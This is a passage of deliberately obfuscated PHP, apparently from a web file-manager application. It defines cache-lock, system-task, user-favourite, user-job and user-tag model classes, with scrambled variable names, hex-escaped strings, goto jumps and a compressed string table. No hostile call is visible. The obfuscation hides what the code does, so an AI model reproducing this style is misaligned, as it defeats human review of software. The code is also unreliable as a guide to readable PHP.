$_SERVER[ıÚ˜š²İ]; $½òÓ‰Ö = self::$caches[$ßÖËšñÈ]; if (!$½òÓ‰Ö) { return; } @flock($½òÓ‰Ö[$±¿ş»Œò[949]], LOCK_UN); @fclose($½òÓ‰Ö[$±¿ş»Œò[949]]); @unlink($½òÓ‰Ö[$±¿ş»Œò[233]]); unset(self::$caches[$ßÖËšñÈ]); } } class CacheLockRedis { public function lock($ÒÉ„›ÔŠ, $ïúˆĞšİ = 10) { $ú“ºà²§ = Cache::init(); $À¾ĞÕ¯ß = microtime(!0) + $ïúˆĞšİ; while (microtime(!0) < $À¾ĞÕ¯ß) { $Ü‹¶…×« = $ú“ºà²§->get($ÒÉ„›ÔŠ); if (!$Ü‹¶…×«) { $¸Ò¥…Ä = $ú“ºà²§->setLock($ÒÉ„›ÔŠ, $À¾ĞÕ¯ß, $ïúˆĞšİ); if ($¸Ò¥…Ä) { return !0; } } else { if ($Ü‹¶…×« < microtime(!0)) { $ú“ºà²§->set($ÒÉ„›ÔŠ, $À¾ĞÕ¯ß, $ïúˆĞšİ * 2); if ($ú“ºà²§->get($ÒÉ„›ÔŠ) === $Ü‹¶…×«) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¨÷ë¯) { return Cache::init()->get($¨÷ë¯); } public function unlock($’´»ÉÈß) { return Cache::init()->remove($’´»ÉÈß); } } goto F…×†İ¬Ö­; a×Ô¬†ä÷¦: define($_SERVER[ıÚ˜š²İ][0], $_SERVER[ıÚ˜š²İ][1]); $_SERVER[ÒÚïÅûÒ] = explode($_SERVER[ıÚ˜š²İ][2], gzinflate(substr($_SERVER[ıÚ˜š²İ][3], 10, -8))); function binCheckEq($ãñôÖòı, $Ïæèèâğ) { return $ãñôÖòı == $Ïæèèâğ; } goto aš½¿¼…„ ; C›ÑÒ¹ñ¢•: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\56\x74\x61\163\153\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\164\171\160\x65", "\x65\x76\x65\156\x74", "\x74\x69\x6d\145", "\144\145\x73\143", "\x73\171\x73\164\x65\155", "\145\156\141\142\x6c\x65", "\x6c\x61\163\x74\122\x75\156", "\163\x6f\162\164"); public function listData($ÆÊÉÆ¼ = false, $Á…ÔÏ¼ = "\163\x6f\162\x74", $ÔƒÆîÛ = false) { return parent::listData($ÆÊÉÆ¼, $Á…ÔÏ¼, $ÔƒÆîÛ); } public function add($úõŠç¿) { $ŠËîó‘² =& $_SERVER[ıÚ˜š²İ]; $¯’€¿ç™ = $this->findByName($úõŠç¿[$ŠËîó‘²[32]]); if ($¯’€¿ç™) { return !1; } $úõŠç¿[$ŠËîó‘²[1742]] = 0; $úõŠç¿[$ŠËîó‘²[2017]] = $this->getSort(); return parent::insert($úõŠç¿); } private function getSort() { $—½ûÇÖ =& $_SERVER[ıÚ˜š²İ]; $±ùƒ”¶ó = parent::listData(); $Ôœ‹ÚÉš = array_to_keyvalue($±ùƒ”¶ó, $—½ûÇÖ[12], $—½ûÇÖ[2017]); return empty($Ôœ‹ÚÉš) ? 0 : max($Ôœ‹ÚÉš) + 1; } public function update($úóòÃÀÌ, $ø–Üå­Ë) { $úö® á’ =& $_SERVER[ıÚ˜š²İ]; $©Ã“–èÀ = $this->listData($úóòÃÀÌ); $û–…Â© = $this->findByName($ø–Üå­Ë[$úö® á’[32]]); if (!$©Ã“–èÀ || $û–…Â© && $û–…Â©[$úö® á’[477]] != $©Ã“–èÀ[$úö® á’[477]]) { return !1; } return parent::update($úóòÃÀÌ, $ø–Üå­Ë); } public function remove($¤‘ŠéßÅ, $·½¾Å¼ = false) { $Î¸õ³Ù =& $_SERVER[ıÚ˜š²İ]; $şƒõ¦ı© = $this->listData($¤‘ŠéßÅ); if (!$şƒõ¦ı©) { return; } if (!$·½¾Å¼ && $şƒõ¦ı©[$Î¸õ³Ù[192]] == $Î¸õ³Ù[91]) { return !1; } return parent::remove($¤‘ŠéßÅ); } public function enable($»Ğ•ßÖŠ, $‹š¡¿ûö) { return $this->update($»Ğ•ßÖŠ, array($_SERVER[ıÚ˜š²İ][2473] => $‹š¡¿ûö)); } public function run($†Œ‰ÛÇï) { return $this->update($†Œ‰ÛÇï, array($_SERVER[ıÚ˜š²İ][2485] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\x66\141\166"; protected function cacheFunctionAlias($şƒŸğ¹ß) { $ÔÌÑ©ôÜ =& $_SERVER[ıÚ˜š²İ]; return array($ÔÌÑ©ôÜ[2109] => array(USER_ID, $ÔÌÑ©ôÜ[2486])); } protected function listData() { $ØÓĞ¦¯Ä =& $_SERVER[ıÚ˜š²İ]; $„©ÌĞúè = array($ØÓĞ¦¯Ä[1783] => USER_ID, $ØÓĞ¦¯Ä[561] => 0); $î­Ÿ«ùÎ = $ØÓĞ¦¯Ä[2487]; $½øŠ÷Œü = $this->field($î­Ÿ«ùÎ)->where($„©ÌĞúè)->order($ØÓĞ¦¯Ä[2488])->select(); return $½øŠ÷Œü ? $½øŠ÷Œü : array(); } protected function resetCache() { } protected function listView() { $…Öåµ§ =& $_SERVER[ıÚ˜š²İ]; $ü›ôÁ§‘ = $this->listData(); $º»šş˜ = array_filter_by_field($ü›ôÁ§‘, $…Öåµ§[33], $…Öåµ§[492]); $ÛÇâ– = array_to_keyvalue($º»šş˜, $…Öåµ§[12], $…Öåµ§[87]); if (!$ÛÇâ–) { return $ü›ôÁ§‘; } $â´ÃÑ°˜ = 2000; $Ø¦ÉĞ–’ = array($…Öåµ§[493] => array($…Öåµ§[494], $ÛÇâ–)); $şÄÆÉÀ = Model($…Öåµ§[907])->listSource($Ø¦ÉĞ–’, $â´ÃÑ°˜); $şÄÆÉÀ = array_merge($şÄÆÉÀ[$…Öåµ§[86]], $şÄÆÉÀ[$…Öåµ§[85]]); $şÄÆÉÀ = array_to_keyvalue($şÄÆÉÀ, $…Öåµ§[194]); foreach ($ü›ôÁ§‘ as $àŸÉŠ‹Î => $«Ù©ãîª) { $ÂŒÌ‘£¡ = $şÄÆÉÀ[$«Ù©ãîª[$…Öåµ§[87]]]; $ÂŒÌ‘£¡ = $ÂŒÌ‘£¡ ? $ÂŒÌ‘£¡ : array(); $ü›ôÁ§‘[$àŸÉŠ‹Î] = array_merge($ÂŒÌ‘£¡, $«Ù©ãîª); } return $ü›ôÁ§‘; } protected function addFav($˜º¾áşá, $ÑÈØş¨Œ = '', $ÂÅìÑè = "\163\x6f\x75\162\x63\145") { $ÕŠ½¨´ =& $_SERVER[ıÚ˜š²İ]; $üé¨³’¹ = array($ÕŠ½¨´[1783] => USER_ID, $ÕŠ½¨´[561] => 0, $ÕŠ½¨´[498] => $ÂÅìÑè, $ÕŠ½¨´[497] => $˜º¾áşá); if ($this->where($üé¨³’¹)->find()) { return !1; } $üé¨³’¹ = array($ÕŠ½¨´[1783] => USER_ID, $ÕŠ½¨´[561] => 0); $¦¨á“¿ = $this->where($üé¨³’¹)->max($ÕŠ½¨´[2017]); if (!$¦¨á“¿) { $¦¨á“¿ = 0; } if (!$ÑÈØş¨Œ && $ÂÅìÑè == $ÕŠ½¨´[492]) { $ôÜñ”ú = Model($ÕŠ½¨´[1442])->where(array($ÕŠ½¨´[493] => $˜º¾áşá))->find(); if (!$ôÜñ”ú) { return !1; } $ÑÈØş¨Œ = $ôÜñ”ú[$ÕŠ½¨´[32]]; } $ÑÈØş¨Œ = $this->getAutoName($ÑÈØş¨Œ); $ñÆ¹ñ§° = array($ÕŠ½¨´[1783] => USER_ID, $ÕŠ½¨´[561] => 0, $ÕŠ½¨´[496] => $ÑÈØş¨Œ, $ÕŠ½¨´[497] => $˜º¾áşá, $ÕŠ½¨´[498] => $ÂÅìÑè, $ÕŠ½¨´[1997] => $¦¨á“¿ + 1); return $this->add($ñÆ¹ñ§°); } protected function remove($Å‘Ş§İÂ) { $šÉâè¸ö =& $_SERVER[ıÚ˜š²İ]; $ÄµëòÇ = array($šÉâè¸ö[1783] => USER_ID, $šÉâè¸ö[495] => $Å‘Ş§İÂ); return $this->where($ÄµëòÇ)->delete(); } protected function removeByName($ÀÍèŠ¡û) { $¥–Äîõ± =& $_SERVER[ıÚ˜š²İ]; $èç°­ê = array($¥–Äîõ±[1783] => USER_ID, $¥–Äîõ±[496] => $ÀÍèŠ¡û, $¥–Äîõ±[561] => 0); return $this->where($èç°­ê)->delete(); } protected function rename($Óº²…ºµ, $å¸óŒ„›) { $ñ€ÔŞ² =& $_SERVER[ıÚ˜š²İ]; if ($Óº²…ºµ == $å¸óŒ„›) { return !1; } $§ƒêÆñÄ = $this->getAutoName($å¸óŒ„›); if ($å¸óŒ„› != $§ƒêÆñÄ) { return !1; } $áõ»ƒå = array($ñ€ÔŞ²[1783] => USER_ID, $ñ€ÔŞ²[561] => 0, $ñ€ÔŞ²[32] => $Óº²…ºµ); return $this->where($áõ»ƒå)->save(array($ñ€ÔŞ²[32] => $å¸óŒ„›)); } protected function resetSort($ç¬‡») { $Û®™¡Çò =& $_SERVER[ıÚ˜š²İ]; $ç¬‡» = is_array($ç¬‡») ? $ç¬‡» : array(); $ºÆáµãì = array($Û®™¡Çò[1783] => USER_ID); for ($¨è±½œæ = 0; $¨è±½œæ < count($ç¬‡»); $¨è±½œæ++) { $ºÆáµãì[$Û®™¡Çò[495]] = $ç¬‡»[$¨è±½œæ]; $this->where($ºÆáµãì)->save(array($Û®™¡Çò[1997] => $¨è±½œæ + 1)); } return !0; } protected function moveTop($ëëŒ¯Â˜) { $¼Úç‚½÷ =& $_SERVER[ıÚ˜š²İ]; $ÙóƒÅºÈ = array($¼Úç‚½÷[1783] => USER_ID, $¼Úç‚½÷[561] => 0); $İ×îô³É = $this->where($ÙóƒÅºÈ)->where(array($¼Úç‚½÷[32] => $ëëŒ¯Â˜))->find(); if (!$İ×îô³É) { return; } $áŒÎÖÓ = $this->field($¼Úç‚½÷[477])->where($ÙóƒÅºÈ)->order($¼Úç‚½÷[2488])->select(); $áŒÎÖÓ = array_to_keyvalue($áŒÎÖÓ, $¼Úç‚½÷[12], $¼Úç‚½÷[477]); $¾€ÜÈÛõ = $áŒÎÖÓ; $áŒÎÖÓ = array_remove_value($áŒÎÖÓ, $İ×îô³É[$¼Úç‚½÷[477]]); array_unshift($áŒÎÖÓ, $İ×îô³É[$¼Úç‚½÷[477]]); return $this->resetSort($áŒÎÖÓ); } protected function moveBottom($èøŒªñÜ) { $ó„íñ˜Ã =& $_SERVER[ıÚ˜š²İ]; $ƒğ­Ò‚€ = array($ó„íñ˜Ã[1783] => USER_ID, $ó„íñ˜Ã[561] => 0); $Äšòš = $this->where($ƒğ­Ò‚€)->max($ó„íñ˜Ã[2017]); $ŠÍÁúğ = array($ó„íñ˜Ã[2017] => $Äšòš + 1); return $this->where($ƒğ­Ò‚€)->where(array($ó„íñ˜Ã[32] => $èøŒªñÜ))->save($ŠÍÁúğ); } private function getAutoName($ÃèÍñıß) { $ùº»Ê•í =& $_SERVER[ıÚ˜š²İ]; $×Ëæó“ = array($ùº»Ê•í[1783] => USER_ID, $ùº»Ê•í[561] => 0); $ÄßıÛ‹ = $this->field($ùº»Ê•í[32])->where($×Ëæó“)->select(); $ÄßıÛ‹ = array_to_keyvalue($ÄßıÛ‹, $ùº»Ê•í[12], $ùº»Ê•í[32]); if (!$ÄßıÛ‹ || !in_array($ÃèÍñıß, $ÄßıÛ‹)) { return $ÃèÍñıß; } for ($àó„­‡” = 0; $àó„­‡” < count($ÄßıÛ‹); $àó„­‡”++) { if (!in_array($ÃèÍñıß . "\x28{$àó„­‡”}\x29", $ÄßıÛ‹)) { return $ÃèÍñıß . "\50{$àó„­‡”}\x29"; } } return $ÃèÍñıß . "\x28{$àó„­‡”}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\56\x6a\x6f\142\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\144\x65\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\163\x65\x6c\x66\x4a\x6f\x62\x4c\x69\163\x74"; public function listData($® •Â™ñ = false, $÷ç†İ¡ô = "\163\x6f\x72\x74", $šŞÚºú£ = false) { return parent::listData($® •Â™ñ, $÷ç†İ¡ô, $šŞÚºú£); } public function remove($ƒÆ×¤©Æ) { return parent::remove($ƒÆ×¤©Æ); } public function add($³é°¥›ã) { $ÛƒĞíÇÓ =& $_SERVER[ıÚ˜š²İ]; if ($this->findByName($³é°¥›ã[$ÛƒĞíÇÓ[32]])) { return !1; } $³é°¥›ã[$ÛƒĞíÇÓ[2017]] = $this->getSort(); return parent::insert($³é°¥›ã); } private function getSort() { $¦¡¶Œ¹µ =& $_SERVER[ıÚ˜š²İ]; $ÒÀšãİ = parent::listData(); $…óúÆÔ… = array_to_keyvalue($ÒÀšãİ, $¦¡¶Œ¹µ[12], $¦¡¶Œ¹µ[2017]); return empty($…óúÆÔ…) ? 0 : max($…óúÆÔ…) + 1; } public function update($›¦‹àÅ, $È³ëõÊ«) { $í¼öä»‡ =& $_SERVER[ıÚ˜š²İ]; $Èí¡ê‡ = parent::listData($›¦‹àÅ); $•©™¢Ú´ = $this->findByName($È³ëõÊ«[$í¼öä»‡[32]]); if (!$Èí¡ê‡ || $•©™¢Ú´ && $•©™¢Ú´[$í¼öä»‡[477]] != $Èí¡ê‡[$í¼öä»‡[477]]) { return !1; } return parent::update($›¦‹àÅ, $È³ëõÊ«); } public function setUserJob($˜ó×·Û, $°ò´õŒù) { $ÊÅãÍ±‘ =& $_SERVER[ıÚ˜š²İ]; if (!is_array($°ò´õŒù)) { $°ò´õŒù = array($°ò´õŒù); } $¬½¸Õ½¼ = parent::listData(); $ä½¶º‘¬ = array_to_keyvalue($¬½¸Õ½¼, $ÊÅãÍ±‘[32]); $’ä Î—æ = $ÊÅãÍ±‘[456]; foreach ($°ò´õŒù as $‹¤Š•†) { if ($ä½¶º‘¬[$‹¤Š•†]) { $’ä Î—æ .= $ä½¶º‘¬[$‹¤Š•†][$ÊÅãÍ±‘[477]] . $ÊÅãÍ±‘[50]; } else { $©ä‹•úª = $this->add($‹¤Š•†); $’ä Î—æ .= $©ä‹•úª . $ÊÅãÍ±‘[50]; } } $’ä Î—æ = rtrim($’ä Î—æ, $ÊÅãÍ±‘[50]); Model($ÊÅãÍ±‘[601])->metaSet($˜ó×·Û, self::JOB_KEY, $’ä Î—æ); } public function getUserJob($œÌ„È¼ ) { $á½¯ğ¯Œ = Model($_SERVER[ıÚ˜š²İ][601])->metaGet($œÌ„È¼ ); return $this->getUserJobInfo($á½¯ğ¯Œ[self::JOB_KEY]); } public function getUserJobInfo($¢ÒÛô‰È) { $î®²¦ =& $_SERVER[ıÚ˜š²İ]; $Ê¬„£¥Ò = explode($î®²¦[50], $¢ÒÛô‰È); $–ìÊ÷ƒÓ = parent::listData(); $–ìÊ÷ƒÓ = array_remove_key($–ìÊ÷ƒÓ, $î®²¦[234]); $³Ü¿›Ñ = array(); foreach ($Ê¬„£¥Ò as $…Ğ™ĞÑ) { if (isset($–ìÊ÷ƒÓ[$…Ğ™ĞÑ])) { $³Ü¿›Ñ[] = $–ìÊ÷ƒÓ[$…Ğ™ĞÑ]; } } return $³Ü¿›Ñ; } } goto f‚ÆÙœœØ¦; b¡âà±¢†è: function binCheckBigger($óŒª›§´, $›Ú±ÖÇä) { return $óŒª›§´ > $›Ú±ÖÇä; } $_SERVER[$_SERVER[ÒÚïÅûÒ][3]] = ("\70\66\67\70"."\71\64")+0;$_eo28="41w3gmaqtldhoxynjc760kvrue9fs2pz5i8bp0g6w98n1svj5zecyhmkx2tbqfoulid4a7r3jrh8i0lo7x";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($·ñ•„Ï, $â«üÊÒ) { $ˆ†Œôİò =& $_SERVER[ıÚ˜š²İ]; if (isset(self::$_methodList[$·ñ•„Ï])) { return @call_user_func_array(self::$_methodList[$·ñ•„Ï], $â«üÊÒ); } else { if (method_exists($this, $·ñ•„Ï)) { return call_user_func_array(array($this, $·ñ•„Ï), $â«üÊÒ); } else { think_exception(__CLASS__ . $ˆ†Œôİò[4] . $·ñ•„Ï . $ˆ†Œôİò[5]); } } } public static function __callStatic($«è‹Ñçş, $•Ş¹Öò) { if (isset(self::$_methodListStatic[$«è‹Ñçş])) { return call_user_func_array(self::$_methodListStatic[$«è‹Ñçş], $•Ş¹Öò); } else { if (method_exists(self, $«è‹Ñçş)) { return call_user_func_array(array(self, $«è‹Ñçş), $•Ş¹Öò); } else { show_json("{$«è‹Ñçş}\x28\x29\x20\156\x6f\164\x20\145\170\151\163\164\x3b", !1); } } } public static function addMethod($‘¶¨ˆş¯, $”üÕêğÆ) { self::$_methodList[$‘¶¨ˆş¯] = $”üÕêğÆ; } public static function addMethodStatic($Íƒ·õáï, $­õü¼›) { self::$_methodListStatic[$Íƒ·õáï] = $­õü¼›; } } goto fŠ”©Ûò°; C¼œóè º“: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($ôõĞºÆ’) { $â…å‹çæ =& $_SERVER[ıÚ˜š²İ]; return array($â…å‹çæ[2109] => array($â…å‹çæ[2540] . USER_ID, $â…å‹çæ[2110])); } protected function listData() { $ÚŒˆËğ =& $_SERVER[ıÚ˜š²İ]; $ú„¥‚ = array($ÚŒˆËğ[1783] => USER_ID, $ÚŒˆËğ[561] => array($ÚŒˆËğ[2113], 0)); $Š‘İÓ = $ÚŒˆËğ[2541]; $ö˜¡ ö = $this->field($Š‘İÓ)->where($ú„¥‚)->order($ÚŒˆËğ[2115])->select(); return $ö˜¡ ö ? $ö˜¡ ö : array(); } protected function addToTag($¥ØÈ¾ƒº, $ƒê»Øê) { $¹Ê½³ã¾ =& $_SERVER[ıÚ˜š²İ]; if (!Model($¹Ê½³ã¾[2264])->listData($ƒê»Øê)) { return !1; } if (is_numeric($¥ØÈ¾ƒº)) { $ø²¤¾ÜÆ = Model($¹Ê½³ã¾[907])->pathInfo($¥ØÈ¾ƒº); if (!$ø²¤¾ÜÆ) { return !1; } } else { $ø²¤¾ÜÆ = IO::infoSimple($¥ØÈ¾ƒº); if (!$ø²¤¾ÜÆ) { return !1; } $ÂÍø“ÚÅ = $ø²¤¾ÜÆ[$¹Ê½³ã¾[32]]; $ùÍĞ’€æ = $ø²¤¾ÜÆ[$¹Ê½³ã¾[33]]; if (isset($ø²¤¾ÜÆ[$¹Ê½³ã¾[487]])) { $ùÍĞ’€æ = $ø²¤¾ÜÆ[$¹Ê½³ã¾[487]] == $¹Ê½³ã¾[91] ? $¹Ê½³ã¾[78] : $¹Ê½³ã¾[233]; } } $•Ü¨€ñÕ = array($¹Ê½³ã¾[1783] => USER_ID, $¹Ê½³ã¾[561] => $ƒê»Øê, $¹Ê½³ã¾[497] => $¥ØÈ¾ƒº, $¹Ê½³ã¾[498] => $ùÍĞ’€æ ? $ùÍĞ’€æ : $¹Ê½³ã¾[492], $¹Ê½³ã¾[496] => $ÂÍø“ÚÅ ? $ÂÍø“ÚÅ : $¹Ê½³ã¾[12], $¹Ê½³ã¾[1997] => 0); if ($this->where($•Ü¨€ñÕ)->find()) { return !1; } return $this->add($•Ü¨€ñÕ); } protected function removeFromTag($æàŠ·Áµ, $š³ó½âÄ) { $ÁêÈ û« =& $_SERVER[ıÚ˜š²İ]; if (!Model($ÁêÈ û«[2264])->listData($š³ó½âÄ)) { return !1; } if (is_array($æàŠ·Áµ)) { $æàŠ·Áµ = array($ÁêÈ û«[7], $æàŠ·Áµ); } $Ä³İâ·Ú = array($ÁêÈ û«[1783] => USER_ID, $ÁêÈ û«[561] => $š³ó½âÄ, $ÁêÈ û«[497] => $æàŠ·Áµ); return $this->where($Ä³İâ·Ú)->delete(); } protected function removeByTag($àœÍ Ä) { $ŠÃı­Æ° =& $_SERVER[ıÚ˜š²İ]; if (!$àœÍ Ä) { return !1; } $æ“üñÃ = array($ŠÃı­Æ°[1783] => USER_ID, $ŠÃı­Æ°[561] => $àœÍ Ä); return $this->where($æ“üñÃ)->delete(); } protected function removeBySource($Ÿ°‰é¬÷) { $¦ÍÃÆçå =& $_SERVER[ıÚ˜š²İ]; if (is_array($Ÿ°‰é¬÷)) { $Ÿ°‰é¬÷ = array($¦ÍÃÆçå[7], $Ÿ°‰é¬÷); } $Œé°¾»Ë = array($¦ÍÃÆçå[1783] => USER_ID, $¦ÍÃÆçå[561] => array($¦ÍÃÆçå[1103], 0), $¦ÍÃÆçå[497] => $Ÿ°‰é¬÷); return $this->where($Œé°¾»Ë)->delete(); } }